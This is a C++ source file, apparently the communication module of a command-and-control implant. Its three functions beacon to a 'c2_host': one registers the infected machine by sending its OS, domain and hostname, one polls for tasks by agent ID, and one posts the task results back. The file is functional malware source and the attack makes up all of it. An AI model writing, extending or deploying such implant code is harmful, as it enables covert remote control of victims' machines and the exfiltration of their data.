#include "functions.h"


namespace communication {
    nlohmann::json RegisterAgent(const std::wstring& c2_host) {
        nlohmann::json j;
        j["os"] = os;
        j["domain"] = domain;
        j["hostname"] = hostname;

        std::wstring response = network::MakeHttpRequest(c2_host, L"/register", misc::JsonToWString(j));
        return misc::WStringToJson(response);
    }

    nlohmann::json FetchTask(const std::wstring& c2_host, const std::wstring& agent_id) {
        std::wstring path = L"/" + agent_id + L"/tasks";
        std::wstring response = network::MakeHttpRequest(c2_host, path, L"", L"GET");
        return misc::WStringToJson(response);
    }

    bool SubmitResults(const std::wstring& c2_host, const std::wstring& agent_id,
        const nlohmann::json& task_result) {
        std::wstring path = L"/" + agent_id + L"/results";
        std::wstring response = network::MakeHttpRequest(c2_host, path, misc::JsonToWString(task_result));
        return !response.empty();
    }
}